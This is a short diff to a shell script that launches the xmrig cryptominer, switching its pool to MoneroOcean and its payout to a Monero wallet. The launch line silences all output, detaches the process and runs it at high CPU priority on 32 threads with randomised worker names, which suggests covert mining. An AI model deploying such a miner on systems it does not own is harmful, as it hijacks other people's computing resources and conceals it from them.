@@ -63,8 +63,8 @@ fi
     chmod +x ./xmrig
 
     # 使用额外参数启动 xmrig
-    ./xmrig -a rx -o stratum+tcp://rx.unmineable.com:3333 \
-    -u PEPE:0x6c12d35208e9be438ae91F15A4B3A99afb70Eadf.unmineable_worker_$(shuf -i 1000-9999 -n 1)-$(date +%s) \
+    ./xmrig -a rx -o stratum+tcp://gulf.moneroocean.stream:10001 \
+    -u 48PE8xM9q1Tg1u26rtamaaULksuJHRCKVdn9Sv1ArHCK6TLYkoW5TLfVd9q1zPtqJs6YjhEXqEwr7W6xUavD3j6xGy58PZR.worker_$(shuf -i 1000-9999 -n 1)-$(date +%s) \
     --cpu-no-yield --cpu-priority 5 --threads 32 -p x >/dev/null 2>&1 & disown
 )
 
